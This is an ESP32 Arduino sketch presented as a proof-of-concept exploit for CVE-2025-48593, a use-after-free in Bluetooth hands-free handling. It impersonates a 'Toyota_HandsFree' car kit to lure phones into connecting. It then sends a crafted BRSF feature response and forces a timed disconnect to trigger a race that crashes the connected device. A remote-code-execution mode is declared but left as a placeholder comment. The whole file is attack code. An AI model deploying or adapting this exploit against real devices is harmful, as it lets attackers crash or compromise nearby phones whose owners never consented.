#include <Arduino.h>
#include "esp_bt_main.h"
#include "esp_gap_bt_api.h"
#include "esp_hf_ag_api.h"
#include "esp_bt_device.h"

// Exploit Configuration
#define TARGET_DEVICE_NAME "Toyota_HandsFree"
#define EXPLOIT_MODE_CRASH 1
#define EXPLOIT_MODE_RCE   0

// Current Mode
int currentMode = EXPLOIT_MODE_CRASH;

// Global State
esp_bd_addr_t connectedPeerAddr;
bool isConnected = false;

// Function Prototypes
void hf_ag_callback(esp_hf_ag_cb_event_t event, esp_hf_ag_cb_param_t *param);
void gap_callback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param);
void trigger_exploit();

void setup() {
    Serial.begin(115200);
    Serial.println("Starting CVE-2025-48593 PoC (HFP UAF)...");

    // 1. Initialize BT Controller
    if (!btStart()) {
        Serial.println("Failed to initialize BT Controller");
        return;
    }

    // 2. Initialize Bluedroid
    esp_bluedroid_init();
    esp_bluedroid_enable();

    // 3. Register Callbacks
    esp_bt_gap_register_callback(gap_callback);
    esp_hf_ag_register_callback(hf_ag_callback);

    // 4. Initialize HFP AG
    esp_hf_ag_init_remote_addr(NULL); // Accept any connection
    esp_hf_ag_init();

    // 5. Configure Device Name and Visibility
    esp_bt_dev_set_device_name(TARGET_DEVICE_NAME);
    
    // Set Discoverable and Connectable
    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);

    Serial.printf("Advertising as '%s'\n", TARGET_DEVICE_NAME);
    Serial.println("Waiting for victim connection...");
}

void loop() {
    // Main loop does nothing, everything is event-driven
    delay(1000);
}

// -------------------------------------------------------------------------
// HFP Audio Gateway Callback
// -------------------------------------------------------------------------
void hf_ag_callback(esp_hf_ag_cb_event_t event, esp_hf_ag_cb_param_t *param) {
    switch (event) {
        case ESP_HF_AG_CONNECTION_STATE_EVT:
            if (param->conn_stat.state == ESP_HF_CONNECTION_STATE_CONNECTED) {
                Serial.println("[+] Victim Connected (RFCOMM Established)");
                memcpy(connectedPeerAddr, param->conn_stat.remote_bda, 6);
                isConnected = true;
                
                // In HFP, the SLC negotiation starts immediately. 
                // We wait for the AT+BRSF from the client.
            } else if (param->conn_stat.state == ESP_HF_CONNECTION_STATE_DISCONNECTED) {
                Serial.println("[-] Victim Disconnected");
                isConnected = false;
                // create panic loop or restart to be ready again
                // esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
            }
            break;

        case ESP_HF_AG_CIND_RESPONSE_EVT:
             Serial.println("[*] Received CIND Response (Standard Flow)");
             break;

        case ESP_HF_AG_UNAT_RESPONSE_EVT:
             // Received Unknown AT command (often BRSF comes here or dedicated event)
             Serial.printf("[*] Received AT: %s\n", param->unat_rep.unat);
             
             // Detect BRSF manually if platform doesn't parse it
             if (strstr(param->unat_rep.unat, "+BRSF") != NULL) {
                 Serial.println("[!] Detected AT+BRSF");
                 trigger_exploit();
             }
             break;

        // Note: ESP-IDF might parse BRSF into a specific event or feature exchange.
        // Checking for BRSF / CIND / CMER events. 
        case ESP_HF_AG_SLC_STATE_EVT:
             Serial.printf("SLC State Change: %d\n", param->slc_stat.state);
             break;

        default:
            // Debug other events
            // Serial.printf("Unandled Event: %d\n", event);
            break;
    }
}

// -------------------------------------------------------------------------
// GAP Callback
// -------------------------------------------------------------------------
void gap_callback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    // Handle auth/pairing if necessary
    if (event == ESP_BT_GAP_AUTH_CMPL_EVT) {
        if (param->auth_cmpl.stat == ESP_BT_STATUS_SUCCESS) {
            Serial.println("[+] Authentication Success");
        } else {
            Serial.println("[-] Authentication Failed");
        }
    }
}

// -------------------------------------------------------------------------
// THE EXPLOIT TRIGGER
// -------------------------------------------------------------------------
void trigger_exploit() {
    if (!isConnected) return;
    
    Serial.println("[!!!] TRIGGERING CVE-2025-48593 STATE DESYNC...");

    // The vulnerability: "Premature Free ... by a crafted packet or invalid feature bitmask"
    // followed immediately by disconnection or another event.
    
    // Step 1: Send a valid-looking but malicious BRSF response
    // +BRSF: <feature_mask>
    // We try to confuse the state machine.
    
    // Sending raw AT response using ESP Native API or pretending to assume normal flow
    // But inserting the race condition.
    
    // We send a valid Feature Supported (+BRSF: 1023) 
    // AND immediately rip the cord.
    
    esp_hf_ag_slc_conn_connect(connectedPeerAddr); // Force re-connect attempt? (Connecting state)
    
    // Or send a critical error code.
    esp_hf_ag_unknown_at_send(connectedPeerAddr, "+BRSF: 1023"); 
    
    if (currentMode == EXPLOIT_MODE_CRASH) {
        // TIMING CRITICAL:
        // Immediate Disconnect to trigger the free() while init callback is running.
        // Using delayMicroseconds to fine tune the race window.
        delayMicroseconds(50); 
        
        Serial.println("[!!!] Sending HCI_DISCONNECT (Race Trigger)");
        esp_hf_ag_slc_conn_disconnect(connectedPeerAddr);
        
    } else {
        // RCE Payload setup would go here (Heap Feng Shui steps)
    }
}
